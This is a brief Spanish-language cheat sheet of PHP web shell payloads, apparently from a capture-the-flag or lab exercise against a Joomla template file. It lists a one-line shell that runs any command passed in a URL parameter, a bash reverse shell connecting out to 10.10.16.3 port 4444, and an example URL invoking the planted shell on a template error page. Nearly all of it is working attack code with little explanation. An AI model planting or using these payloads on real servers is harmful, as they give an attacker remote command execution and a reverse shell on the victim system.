windows y linux

<?php system($_GET["cmd"]); ?>                  


<?php system("whoami"); ?>

<?php system("bash -c 'exec bash -i &>/dev/tcp/10.10.16.3/4444 <&1'"); ?>

<?php system($_GET["xmd"]); ?>  asi ejecutamos los comandos com = en el navegador

http://10.10.10.150/templates/beez3/error.php?xmd=whoami
